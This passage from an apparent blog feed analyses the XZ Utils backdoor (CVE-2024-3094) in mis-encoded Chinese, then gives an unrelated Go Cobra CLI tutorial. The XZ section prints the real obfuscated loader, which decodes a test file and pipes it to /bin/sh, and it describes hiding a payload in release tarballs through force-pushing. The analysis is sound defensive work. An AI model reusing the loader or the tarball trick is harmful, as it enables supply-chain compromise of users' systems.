listä¸ŠæŠ¥æ­¤æ¬¡äº‹ä»¶ã€‚</li><li>2024å¹´3æœˆ30æ—¥ï¼ŒXZé¡¹ç›®åˆ›å»ºè€…Lasse Collinså¯¹æ¶æ„ä»£ç åšå‡ºå£°æ˜å’Œå“åº”ã€‚</li></ul><h1 id="å‘ç°è€…Andres-Freundçš„é‚®ä»¶æŠ¥å‘Š"><a href="#å‘ç°è€…Andres-Freundçš„é‚®ä»¶æŠ¥å‘Š" class="headerlink" title="å‘ç°è€…Andres Freundçš„é‚®ä»¶æŠ¥å‘Š"></a>å‘ç°è€…Andres Freundçš„é‚®ä»¶æŠ¥å‘Š</h1><p>æœ¬èŠ‚å¯¹<code>Andres Freund</code>çš„ç»™openwallçš„é‚®ä»¶åšä¸­æ–‡å¤è¿°ï¼Œæºå¸¦ä¸ªäººéƒ¨åˆ†ä¸»è§‚å®¡è§†ã€å­¦ä¹ å’Œæ¨æµ‹ã€‚è¯¥é‚®ä»¶åŸæ–‡linkå¦‚ä¸‹ï¼Œè¯»è€…å¯è‡ªè¡Œå“å‘³åŸå‘³ï¼š<a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">https://www.openwall.com/lists/oss-security/2024/03/29/4</a></p><p><code>Andres Freund</code>è¿‡å»å‡ å‘¨åœ¨ä½¿ç”¨Debian Sidæ—¶ï¼Œå‘ç°SSHå ç”¨ç‡é«˜çš„å¥‡æ€ªç°è±¡ï¼Œå¾—åˆ°ç»“è®ºï¼šä¸Šæ¸¸çš„xzä»“åº“çš„releaseçš„ä»£ç å‹ç¼©åŒ…å·²è¢«äººæ¤å…¥åé—¨ã€‚</p><pre><code>ä¸Šæ¸¸ï¼šæŒ‡æ ¹æºçš„ä»£ç ä»“åº“ï¼Œä¹Ÿå°±æ˜¯XZæœ¬èº«çš„githubä»“åº“çš„æ„æ€ï¼Œè€ŒéDebianè‡ªå·±ä¿®æ”¹çš„ç‰ˆæœ¬ã€‚æ¯”å¦‚Debianæ˜¯éå¸¸çŸ¥åçš„Linuxé¡¹ç›®ï¼Œä»–ä¼šé›†æˆå…¶ä»–GNUçš„å¼€æºé¡¹ç›®ï¼ˆä¸Šæ¸¸ï¼‰ä½œä¸ºè‡ªèº«çš„å·¥å…·ã€‚æ¯”å¦‚xzæ˜¯å¼€æºå‹ç¼©ç¨‹åºï¼Œä»–ä¼šæŠŠxzçš„æœ‰tagç‰ˆæœ¬çš„ä»£ç åŒ…é›†æˆå…¥è‡ªå·±çš„å·¥å…·é¡¹ç›®ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œä¸ºäº†æ›´å¥½çš„é›†æˆæ•ˆæœï¼ŒDebianå¼€å‘è€…ä¼šå¯¹æ‹‰æ¥çš„XZä»£ç è¿›è¡Œä¸€äº›ä¿®æ”¹ï¼ˆæ­¤æ—¶ç§°ä¸‹æ¸¸ï¼‰ã€‚</code></pre><p>æœ€å¼€å§‹ä»¥ä¸ºæ˜¯Debianè‡ªå·±çš„é›†æˆå›¢é˜Ÿä¿®æ”¹XZå¯¼è‡´çš„è½¯ä»¶å¼‚å¸¸ç°è±¡ï¼Œä½†æ˜¯ç»è¿‡æº¯æºï¼ŒAndres Freundç¡®å®šæ˜¯XZæœ¬èº«ã€‚</p><h3 id="å®¡è®¡é¡ºåº"><a href="#å®¡è®¡é¡ºåº" class="headerlink" title="å®¡è®¡é¡ºåº"></a>å®¡è®¡é¡ºåº</h3><ol><li>Debianè‡ªå·±æ‹‰å–çš„XZä»“åº“ã€‚</li></ol><p>link: <a href="https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63">https://salsa.debian.org/debian/xz-utils/-/blob/debian/unstable/m4/build-to-host.m4?ref_type=heads#L63</a></p><p>å¦‚å›¾æ˜¯Debian Linuxé¡¹ç›®ï¼Œå…¶æ‹‰å–äº†Xzé¡¹ç›®ä½œä¸ºå­é¡¹ç›®ï¼Œä¹¦å†™æœ¬æ–‡æ—¶è¿˜å¯ä»¥çœ‹åˆ°æ¼æ´ç‰ˆæœ¬çš„XZã€‚XZåŸå°ä¸åŠ¨çš„æ‹¿è¿‡æ¥ï¼Œä¼šæŒ‰ç…§æºé¡¹ç›®çš„ç‰ˆæœ¬å‘½åï¼Œç›´æ¥ç»™å…¶åŒå‘½ååˆ†æ”¯ï¼Œå¦‚<code>v5.6.0</code>ã€‚å¦‚æœä¸ºäº†é›†æˆéœ€è¦ï¼ŒDebianä¼šå‘½å<code>v5.6.0-0.1</code>è¿™æ ·å­çš„åˆ†æ”¯åã€‚</p><p><img src="/2024/08/27/code_audit/cve-2024-3094(1)/md11.png" alt="md11"></p><ol><li>XZé¡¹ç›®</li></ol><p>ç¡®å®šDebiané¡¹ç›®å­˜åœ¨æ­¤åé—¨åï¼Œè¿›ä¸€æ­¥å®¡è®¡åˆ°è½¯ä»¶ä¾›åº”é“¾ä¸Šæ¸¸çš„XZé¡¹ç›®ã€‚å‘ç°githubé¡¹ç›®æœ¬èº«å†å²commitå’Œæ¼æ´ç‰ˆæœ¬çš„åˆ†æ”¯å¹¶æ²¡æœ‰åé—¨ï¼Œä½†æ˜¯åé—¨ä»…åœ¨æ¼æ´ç‰ˆæœ¬çš„releaseçš„æºä»£ç å‹ç¼©åŒ…ã€‚</p><p>åé—¨ç‰ˆæœ¬çš„æºä»£ç æ²¡æœ‰åé—¨ï¼Œä½†æ˜¯releaseæœ‰ï¼Œå…¶ä¸¤ä¸ªåé—¨ç‰ˆæœ¬çš„linkï¼š</p><p><a href="https://github.com/tukaani-project/xz/releases/tag/v5.6.0">https://github.com/tukaani-project/xz/releases/tag/v5.6.0</a></p><p><a href="https://github.com/tukaani-project/xz/releases/tag/v5.6.1">https://github.com/tukaani-project/xz/releases/tag/v5.6.1</a></p><p><img src="/2024/08/27/code_audit/cve-2024-3094(1)/md12.png" alt="md12"></p><p><img src="/2024/08/27/code_audit/cve-2024-3094(1)/md13.png" alt="md13"></p><p>æˆ‘çœ‹åˆ°æ­¤å¤„æ—¶æ„£äº†ä¸€ä¸‹ï¼Œå› ä¸ºgithubå‘å¸ƒreleaseä¸€èˆ¬å°±æ˜¯ä¸ºäº†å‘å¸ƒå¼€å‘è€…è‡ªå·±ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸€èˆ¬æµç¨‹æ˜¯ï¼š</p><pre><code>localæ‰“tag-&gt;æ¨é€tagåˆ°è¿œç¨‹åˆ†æ”¯-&gt;æŒ‡å®štagå‘å¸ƒrelease</code></pre><p>æ­¤æ—¶releaseé»˜è®¤æœ‰æºä»£ç å‹ç¼©åŒ…ï¼ˆå¦‚ä¸Šå›¾çš„zipå’Œtar.gzé»˜è®¤å°±å­˜åœ¨çš„ä¸¤ä¸ªæ ¼å¼çš„æºä»£ç å‹ç¼©åŒ…ï¼‰ï¼Œä½†æ˜¯ä¸€èˆ¬æ²¡æƒ³è¿‡releaseåæŠŠè¿™ä¸ªcommitåˆ é™¤ã€‚</p><p>æˆ‘è‡ªå·±æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå…¶å®åœ¨<code>release</code>ä¹‹åï¼Œ<code>git reset</code>åˆ°<strong>ä¹‹å‰commit</strong>å†<code>git push --force</code>å°±å¯ä»¥å®ç°è¿™ä¸ªæ‰‹æ³•ã€‚<strong>releaseåŒ…å«åé—¨</strong>ï¼Œä½†æ˜¯æˆ‘åˆè®©<strong>æºä»£ç çš„commitå›æ»šåˆ°æ²¡æœ‰åé—¨çš„æ—¶å€™</strong>ã€‚</p><pre><code>localæ‰“tag-&gt;æ¨é€tagåˆ°è¿œç¨‹åˆ†æ”¯-&gt;æŒ‡å®štagå‘å¸ƒrelease-&gt;local git reset-&gt;git push origin --force</code></pre><p>è¿™ä¸ªç»†èŠ‚éå¸¸å®ç”¨ï¼Œ<strong>releaseçš„é»˜è®¤æºç å‹ç¼©åŒ…æ²¡æœ‰ä»»ä½•gitä¿¡æ¯</strong>ï¼Œä½†æ˜¯Debiané‚£è¾¹çš„ä¹ æƒ¯åˆ<em>åªæ˜¯çœ‹ä¸Šæ¸¸è½¯ä»¶åº“çš„ç‰¹å®šTagå’ŒReleaseæ‹¿TarballåŒ…</em>ã€‚æ”»å‡»è€…æ‘¸æ¸…Debiané›†æˆä¸Šæ¸¸ä»£ç çš„ä¹ æƒ¯ï¼Œå·§å¦™åˆ©ç”¨äº†releaseæ²¡æœ‰gitä¿¡æ¯å¾ˆéš¾å‘ç°çš„ç‰¹æ€§ã€‚</p><pre><code>Tarballï¼šå‹ç¼©åŒ…ï¼ŒåŸºæœ¬æŒ‡releaseé»˜è®¤çš„Tar.gzå’ŒZipçš„æºä»£ç åŒ…ã€‚</code></pre><p>ä»¥ä¸Šå°±æ˜¯æŠ•æ¯’æ‰‹æ³•ï¼Œå‘ç°è€…éšåç®€å•å®¡è®¡å’Œåˆ—ä¸¾äº†æ¶æ„ä»£ç è¿è¡Œæœºåˆ¶ï¼Œæ­¤å¤„æ‘˜å–ä¸€å¤„ä»£ç æ··æ·†ç‰‡æ®µï¼š</p><pre><code>tests/files/bad-3-corrupt_lzma2.xztests/files/good-large_compressed.lzm</code></pre><p>å…¶ä¸­ï¼š</p><pre><code>export i=&quot;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +724)&quot;;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31265|tr &quot;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&quot; &quot;\0-\377&quot;)|xz -F raw --lzma1 -dc|/bin/sh</code></pre><p>ä¸Šè¿°ä»£ç ä¼šåŠ è½½æ¶æ„ä»£ç è¿›å…¥<code>liblzma_la-crc64-fast.o</code>ï¼Œè¯¥ä»£ç åªé’ˆå¯¹RPMæˆ–debianæ„å»ºçš„x86-64æ¶æ„çš„linuxï¼Œå¦‚ä¸‹Florian Weimerä»è¯¥åº“æ–‡ä»¶æå–çš„éƒ¨åˆ†å½±å“ç‰‡æ®µï¼š</p><pre><code>if ! (echo &quot;$build&quot; | grep -Eq &quot;^x86_64&quot; &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo &quot;$build&quot; | grep -Eq &quot;linux-gnu$&quot; &gt; /dev/null 2&gt;&amp;1);thenBuilding with gcc and the gnu linker    if test &quot;x$GCC&quot; != &#39;xyes&#39; &gt; /dev/null 2&gt;&amp;1;then    exit 0    fi    if test &quot;x$CC&quot; != &#39;xgcc&#39; &gt; /dev/null 2&gt;&amp;1;then    exit 0    fi    LDv=$LD&quot; -v&quot;    if ! $LDv 2&gt;&amp;1 | grep -qs &#39;GNU ld&#39; &gt; /dev/null 2&gt;&amp;1;thenexit 0Running as part of a debian or RPM package build:    if test -f &quot;$srcdir/debian/rules&quot; || test &quot;x$RPM_ARCH&quot; = &quot;xx86_64&quot;;then</code></pre><p>å†é‡æ–°è¿è¡Œåé—¨ç‰ˆæœ¬çš„Linuxæ—¶ï¼Œæµ‹è¯•äº†ä¸‹åé—¨å¯¹SSHæ€§èƒ½çš„å½±å“ï¼Œå‘ç°æ­£å¸¸æ‹’ç»è¿æ¥æ—¶çš„é€Ÿåº¦ä¼šæ…¢ä¸‰å€ï¼š</p><pre><code>time ssh nonexistant@...alhostbefore:nonexistant@...alhost: Permission denied (publickey).before:real    0m0.299suser    0m0.202ssys    0m0.006safter:nonexistant@...alhost: Permission denied (publickey).real    0m0.807suser    0m0.202ssys    0m0.006stimeå‘½ä»¤çš„**real**æŒ‡å®é™…ä½¿ç”¨æ—¶é—´ï¼Œå¦å¤–æˆ‘ä»¬å¯ä»¥åœ¨è¾“å‡ºä¸­çœ‹åˆ°useræ—¶é—´å’Œsysæ—¶é—´ã€‚useræŒ‡ç”¨æˆ·æ€æ—¶é—´ï¼Œæ¯”å¦‚æˆ‘ä»¬å†™äº†è®¡ç®—å¯†é›†å‹ç¨‹åºï¼Œè¯¥æ—¶é—´é•¿ï¼Œæ„å‘³ç€CPUé•¿æ—¶é—´å¤„ç†æˆ‘ä»¬çš„ç¨‹åºï¼Œä¸æ–‡ä»¶ã€ç½‘ç»œIOæ— å…³ï¼›sysæŒ‡å†…æ ¸æ€ï¼ˆæˆ–ç§°system levelï¼‰ï¼Œä¸»è¦åšè°ƒåº¦ç¡¬ä»¶èµ„æºï¼ˆå¦‚å†…å­˜ã€å…¶ä»–ç¡¬ä»¶ï¼‰ã€IOç›¸å…³çš„CPUå¤„ç†ï¼Œå¦‚æœæˆ‘ä»¬å†™äº†é«˜IOç¨‹åºï¼Œåˆ™sysæ—¶é—´ä¼šé•¿ã€‚</code></pre><h1 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h1><ol><li><p>è¿™æ˜¯å…¸å‹çš„è½¯ä»¶ä¾›åº”é“¾æŠ•æ¯’äº‹ä»¶ï¼Œæ”»å‡»è€…ä»ä¸Šæ¸¸ä»“åº“å…¥æ‰‹ï¼Œå‘Debianè¿™ç§é‡é‡çº§å¼€æºäº§å“æŠ•æ¯’ã€‚<br>ä½†æ˜¯ï¼Œå¦‚æœæŠ•æ¯’æˆåŠŸå°†åœ¨å…¨ä¸–ç•ŒèŒƒå›´å†…è·å–éå¸¸åºå¤§çš„æƒé™ã€‚æˆ‘ä»¬æ²¡æ³•ä¿è¯è¿™åªæ˜¯å¼€æºç¤¾åŒºçš„ä¸€ä¸ªä¸ªä¾‹ï¼Œç›¸ä¿¡æ›´å¤šçš„äººç”šè‡³åŒ…æ‹¬éå¸¸ä¼˜ç§€çš„å®¡è®¡ä¸“å®¶ï¼Œåœ¨é‡åˆ°è¿™æ¬¡äº‹ä»¶çš„å‘ç°è€…åœ¨æµ‹è¯•ç¨‹åºæ—¶çš„é—®é¢˜ï¼Œå¯èƒ½æ²¡æœ‰è¿™ä¹ˆç»†å¿ƒã€è€å¿ƒçš„å®¡è®¡æº¯æºè¡Œä¸ºã€‚</p></li><li><p>å¼€æºç¤¾åŒºçš„git code reviewæœºåˆ¶æ˜¯å¦ä¾ç„¶å­˜åœ¨ç¼ºé™·ï¼Ÿ</p><p> gité¡¹ç›®è¿è¥è€…åœ¨mergeåˆ«äººä»£ç æ˜¯å¦ä¼šè¯¦å°½æ£€æŸ¥code snippetsï¼Ÿæˆ–è€…ç»™äº†å¼€å‘æƒé™è€…ä»¥releaseã€tagçš„æƒé™ï¼Œæ˜¯å¦ä¼šå®¡è®¡tarballä»£ç ï¼Ÿæˆ–è€…æ˜¯å¦å…è®¸éadminæƒé™çš„å¼€å‘è€…å¯¹åˆ†æ”¯è¿›è¡Œpush â€“forceæ“ä½œï¼Œè¿›è€Œæ–¹ä¾¿å¼€å‘è€…å®Œæˆæ¶æ„commitç„¶åå›æ»šåˆ°æ— æ¶æ„ä»£ç çš„commitçš„è™šæ™ƒä¸€æªçš„æ“ä½œï¼Ÿ</p></li><li><p>æ”»å‡»è€…å…³é—­äº†Googleçš„Oss Fuzzå¯¹å¼€æºäº§å“è¿›è¡Œçš„å‡½æ•°æµ‹è¯•é¿å…æš´éœ²ï¼Œè¿™æ„å‘³ç€Googleçš„Oss Fuzzä¸ä»…å¯å®¡è®¡å´©æºƒå¼‚å¸¸ï¼Œè€Œä¸”å¯¹å®‰å…¨äº‹ä»¶æœ‰æ£€æµ‹èƒ½åŠ›ã€‚æ­¤ç§æºä»£ç å®¡è®¡ã€æ„å»ºFuzzç›¸å…³çš„æµ‹è¯•ç±»å·¥å…·ï¼Œå¯æé†’å¼€å‘è€…æ„è¯†åˆ°æ¶æ„ä»£ç çš„å­˜åœ¨ã€‚å¦å¤–ï¼Œå‘ç°è€…Andres Freundä½¿ç”¨Valgrindè¿™ç§å†…å­˜åˆ†æå·¥å…·æ„è¯†åˆ°æœ¬æ¬¡åé—¨çš„å­˜åœ¨ã€‚ä¼˜ç§€çš„æµ‹è¯•ç±»å·¥å…·åœ¨å®‰å…¨å®¡è®¡æ–¹é¢è¡¨ç°è‰¯å¥½ã€‚</p></li><li><p>è€ƒè™‘åˆ°è½¯ä»¶ä¾›åº”é“¾å®‰å…¨ï¼Œæœ¬æ¬¡ä¾›åº”é“¾è·¯çº¿è™½ç„¶ä¸é•¿ï¼Œä½†æ˜¯è€ƒè™‘åˆ°å¼€æºç¤¾åŒºä¸Šä¸‹æ¸¸è½¯ä»¶å¼€å‘å›¢é˜Ÿè¿¥å¼‚ï¼Œé£æ ¼è¿¥å¼‚ï¼Œè®©ä¸“é—¨çš„äººè¿›è¡Œä»£ç å®¡è®¡ç¡®å®æ¯”è¾ƒä¸ºéš¾äººç±»ã€‚ä½†æ˜¯æ˜¯å¦åº”è¯¥å¢åŠ å®‰å…¨æ‰«æå·¥å…·ï¼Œå¡æ¯ä¸€ä¸ªç¯èŠ‚ï¼Ÿå› ä¸ºå¦‚æœä¸€ä¸ªç¯èŠ‚å‘ç°é—®é¢˜ï¼Œé‚£ä¹ˆæŠ•æ¯’è€…å¤„å¿ƒç§¯è™‘çš„ä¾›åº”é“¾é•¿çº¿æŠ•æ¯’åˆ™ä¼šæš´éœ²ã€‚</p></li><li><p>æµé‡æ£€æµ‹å·¥å…·æ˜¯å¦ä¼šæ£€æµ‹SSHçš„ç‰¹å®šå­—èŠ‚æ˜¯å¦å¼‚å¸¸ï¼Ÿå¼€å‘è€…æ„å»ºäº†åº•å±‚å‡½æ•°ï¼Œä½¿å¾—SSHåè®®çš„ç‰¹å®šå­—èŠ‚ä»0x00åˆ°0x03ä¸ç­‰ï¼Œæµé‡æ£€æµ‹å·¥å…·å¦‚æœèƒ½æ³¨æ„åˆ°æ™®é€šSSHåè®®åº”è¯¥ä¸ä¼šæœ‰å‡ºæ ¼å­—èŠ‚ç‰¹å¾ï¼Œè¿™ä¹Ÿå¯ä»¥å¢å¤§å¼‚å¸¸é—®é¢˜ã€‚</p></li></ol><h1 id="æ„Ÿæ‚Ÿ"><a href="#æ„Ÿæ‚Ÿ" class="headerlink" title="æ„Ÿæ‚Ÿ"></a>æ„Ÿæ‚Ÿ</h1><ol><li>è‹±æ–‡åŒºçš„å®‰å…¨ä¸“å®¶è§‚ç‚¹æ¸…æ™°ï¼Œæ¨ç†é“¾ä¹‹é•¿ï¼Œåšå®¢ä¼—å¤šï¼Œå¼€æºç¤¾åŒºé«˜æ‰‹ä¼—å¤šã€‚å°½ç®¡æœ‰çº°æ¼ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºå¼€æºç¤¾åŒºçš„DevOpsã€æ„å»ºã€æµ‹è¯•å·¥å…·ç›¸å¯¹å›½å†…å¤§éƒ¨åˆ†ä¼ä¸šæ›´ä¸¥æ ¼ã€ä¸“ä¸šã€‚</li><li>è½¯ä»¶ä¾›åº”é“¾å®‰å…¨ï¼Œæ­¤é¢†åŸŸç ”ç©¶åœ¨æœªæ¥ä¾ç„¶å……æ»¡å¼€æ‹“æ€§ã€‚</li></ol><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><p>å‚è€ƒé“¾æ¥ä¸åˆ†å…ˆåã€‚</p><p><a href="https://en.wikipedia.org/wiki/XZ_Utils_backdoor">https://en.wikipedia.org/wiki/XZ_Utils_backdoor</a><br><a href="https://www.openwall.com/lists/oss-security/2024/03/29/4">https://www.openwall.com/lists/oss-security/2024/03/29/4</a><br><a href="https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/#jfrog-oss-tools-for-detecting-cve-2024-3094">https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/#jfrog-oss-tools-for-detecting-cve-2024-3094</a><br><a href="https://github.com/tukaani-project/xz/tree/master/src/liblzma">https://github.com/tukaani-project/xz/tree/master/src/liblzma</a><br><a href="https://github.com/google/oss-fuzz/blob/master/docs/getting-started/new_project_guide.md">https://github.com/google/oss-fuzz/blob/master/docs/getting-started/new_project_guide.md</a></p>]]></content>
      
      
      <categories>
          
          <category> code-audit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Cobra</title>
      <link href="/2024/08/24/Go/Cobra/"/>
      <url>/2024/08/24/Go/Cobra/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="#åˆå§‹åŒ–é¡¹ç›®">åˆå§‹åŒ–é¡¹ç›®</a></li><li><a href="#cobraç»“æ„ä½“">cobraç»“æ„ä½“</a></li><li><a href="#init">init</a></li><li><a href="#flag">flag</a></li><li><a href="#xxxcmdç»“æ„ä½“æ–¹æ³•æ‰§è¡Œé¡ºåº">xxxCmdç»“æ„ä½“æ–¹æ³•æ‰§è¡Œé¡ºåº</a></li><li><a href="#éšè—æŸä¸ªcobraå‘½ä»¤çš„æç¤ºä¿¡æ¯">éšè—æŸä¸ªcobraå‘½ä»¤çš„æç¤ºä¿¡æ¯</a></li></ul><p>å‚è€ƒé“¾æ¥ï¼š</p><pre><code>https://github.com/spf13/cobrahttps://github.com/spf13/cobra/blob/main/user_guide.mdhttps://github.com/spf13/cobra-cli/blob/main/README.mdhttps://blog.kelu.org/tech/2021/04/10/kubernetes-cobra.html</code></pre><h3 id="åˆå§‹åŒ–é¡¹ç›®"><a href="#åˆå§‹åŒ–é¡¹ç›®" class="headerlink" title="åˆå§‹åŒ–é¡¹ç›®"></a>åˆå§‹åŒ–é¡¹ç›®</h3><p>å…ˆgo mod init åŒ…åæ¥åˆå§‹åŒ–ä¸€ä¸ªgo.mod(å‚è€ƒæœ¬ç›®å½•æ–‡ç« ã€ŠgoModInitã€‹)</p><pre><code>go mod init github.com/senranja/PPP</code></pre><p>cdè¿›å…¥PPPç›®å½•åï¼Œä½¿ç”¨cobraå‘½ä»¤è¿›è¡Œåˆå§‹åŒ–</p><pre><code>cobra-cli init  --license apache  --author &quot;Steve Francia spf@spf13.com&quot;  åˆå§‹åŒ–cobraé¡¹ç›®cobra-cli add serve  æ·»åŠ å­å‘½ä»¤cobra-cli add create -p &#39;configCmd&#39; æŒ‡å®šçˆ¶çº§å‘½ä»¤åˆ›å»ºå­å‘½ä»¤</code></pre><h3 id="cobraç»“æ„ä½“"><a href="#cobraç»“æ„ä½“" class="headerlink" title="cobraç»“æ„ä½“"></a>cobraç»“æ„ä½“</h3><p>å…¶ä¸­app/cmd/root.goä¸­ï¼Œä¸»è¦æ˜¯å›´ç»•ç»“æ„ä½“ xxxCmd æ¥è®¾ç½®Useã€Argsã€Longã€Shortã€Runç³»åˆ—ã€ç­‰å†…å®¹</p><p>//å¯ä»¥è‡ªå®šä¹‰ä»»æ„Executeï¼Œåæ­£å¾—æ‰§è¡Œäº† rootCmd.Execute() è¿™ä¸ªå‡½æ•°</p><pre><code>func Execute() error &#123;    return rootCmd.Execute()&#125;</code></pre><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>//åˆå§‹åŒ–çš„ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨è¿™é‡Œç»‘å®šå„ç§flagã€‚å…¶ä¸­æœ‰Pçš„æ—¶æœ‰ç¼©å†™çš„ï¼Œæ²¡Pçš„æ˜¯æ²¡æœ‰ç¼©å†™çš„ï¼Œæ²¡Pçš„é€šå¸¸â€”radactå°±å¯ä»¥è¡¨ç¤ºæ²¡æœ‰ä»€ä¹ˆå€¼</p><pre><code>func init() &#123;    cobra.OnInitialize(initConfig) //ç”¨æ¥åˆå§‹åŒ–æ—¥å¿—çº§åˆ«ç›¸å…³çš„ä¸œè¥¿&#125;</code></pre><p>æˆ‘ä»¬çŸ¥é“ init å‡½æ•°æ˜¯ Golang ä¸­åˆå§‹åŒ–åŒ…çš„æ—¶å€™ç¬¬ä¸€ä¸ªè°ƒç”¨çš„å‡½æ•°ã€‚åœ¨ cmd/root.go ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ° init å‡½æ•°ä¸­è°ƒç”¨äº† cobra.OnInitialize(initConfig)ï¼Œä¹Ÿå°±æ˜¯æ¯å½“æ‰§è¡Œæˆ–è€…è°ƒç”¨å‘½ä»¤çš„æ—¶å€™ï¼Œå®ƒéƒ½ä¼šå…ˆæ‰§è¡Œ init å‡½æ•°ä¸­çš„æ‰€æœ‰å‡½æ•°ï¼Œç„¶åå†æ‰§è¡Œ execute æ–¹æ³•ã€‚è¯¥åˆå§‹åŒ–å¯ç”¨äºåŠ è½½é…ç½®æ–‡ä»¶æˆ–ç”¨äºæ„é€ å‡½æ•°ç­‰ç­‰ï¼Œè¿™å®Œå…¨ä¾èµ–äºæˆ‘ä»¬åº”ç”¨çš„å®é™…æƒ…å†µã€‚</p><p>åœ¨åˆå§‹åŒ–å‡½æ•°é‡Œé¢ cobra.OnInitialize(initConfig) è°ƒç”¨äº† initConfig è¿™ä¸ªå‡½æ•°ï¼Œæ‰€æœ‰ï¼Œå½“ rootCmd çš„æ‰§è¡Œæ–¹æ³• RUN: func è¿è¡Œçš„æ—¶å€™ï¼ŒrootCmd æ ¹å‘½ä»¤å°±ä¼šé¦–å…ˆè¿è¡Œ initConfig å‡½æ•°ï¼Œå½“æ‰€æœ‰çš„åˆå§‹åŒ–å‡½æ•°æ‰§è¡Œå®Œæˆåï¼Œæ‰ä¼šæ‰§è¡Œ rootCmd çš„ RUN: func æ‰§è¡Œå‡½æ•°ã€‚</p><pre><code>func initConfig() &#123;    if cfgFile != &quot;&quot; &#123;        // Use config file from the flag.        viper.SetConfigFile(cfgFile)    &#125; else &#123;        // Find home directory.        home, err := os.UserHomeDir()        cobra.CheckErr(err)        // Search config in home directory with name &quot;.cobra&quot; (without extension).        viper.AddConfigPath(home)        viper.SetConfigType(&quot;yaml&quot;)        viper.SetConfigName(&quot;.cobra&quot;)    &#125;    viper.AutomaticEnv()    if err := viper.ReadInConfig(); err == nil &#123;        fmt.Println(&quot;Using config file:&quot;, viper.ConfigFileUsed())    &#125;&#125;</code></pre><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><pre><code>rootCmd.PersistentFlags().StringVar(&amp;cfgFile, &quot;config&quot;, &quot;&quot;, &quot;config file (default is $HOME/.cobra.yaml)&quot;)rootCmd.PersistentFlags().StringP(&quot;author&quot;, &quot;a&quot;, &quot;YOUR NAME&quot;, &quot;author name for copyright attribution&quot;)rootCmd.PersistentFlags().StringVarP(&amp;userLicense, &quot;license&quot;, &quot;l&quot;, &quot;&quot;, &quot;name of license for the project&quot;)rootCmd.PersistentFlags().Bool(&quot;viper&quot;, true, &quot;use Viper for configuration&quot;)viper.BindPFlag(&quot;author&quot;, rootCmd.PersistentFlags().Lookup(&quot;author&quot;))viper.BindPFlag(&quot;useViper&quot;, rootCmd.PersistentFlags().Lookup(&quot;viper&quot;))viper.SetDefault(&quot;author&quot;, &quot;NAME HERE &lt;EMAIL ADDRESS&gt;&quot;)viper.SetDefault(&quot;license&quot;, &quot;apache&quot;)rootCmd.AddCommand(addCmd)rootCmd.AddCommand(initCmd)</code></pre><h3 id="xxxCmdç»“æ„ä½“æ–¹æ³•æ‰§è¡Œé¡ºåº"><a href="#xxxCmdç»“æ„ä½“æ–¹æ³•æ‰§è¡Œé¡ºåº" class="headerlink" title="xxxCmdç»“æ„ä½“æ–¹æ³•æ‰§è¡Œé¡ºåº"></a>xxxCmdç»“æ„ä½“æ–¹æ³•æ‰§è¡Œé¡ºåº</h3><pre><code>PersistentPreRunPreRunRunPostRunPersistentPostRun</code></pre><h3 id="éšè—æŸä¸ªcobraå‘½ä»¤çš„æç¤ºä¿¡æ¯"><a href="#éšè—æŸä¸ªcobraå‘½ä»¤çš„æç¤ºä¿¡æ¯" class="headerlink" title="éšè—æŸä¸ªcobraå‘½ä»¤çš„æç¤ºä¿¡æ¯"></a>éšè—æŸä¸ªcobraå‘½ä»¤çš„æç¤ºä¿¡æ¯</h3><pre><code>rootCmd.PersistentFlags().StringP(&quot;config&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)å¯ä»¥ä½¿ç”¨ MarkHidden() å‡½æ•°æ¥è¡¨ç¤ºæŸä¸ªä¿¡æ¯çš„éšè—rootCmd.PersistentFlags().MarkHidden(&quot;config&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>viper</title>
      <link href="/2024/08/24/Go/viper/"/>
      <url>/2024/08/24/Go/viper/</url>
      
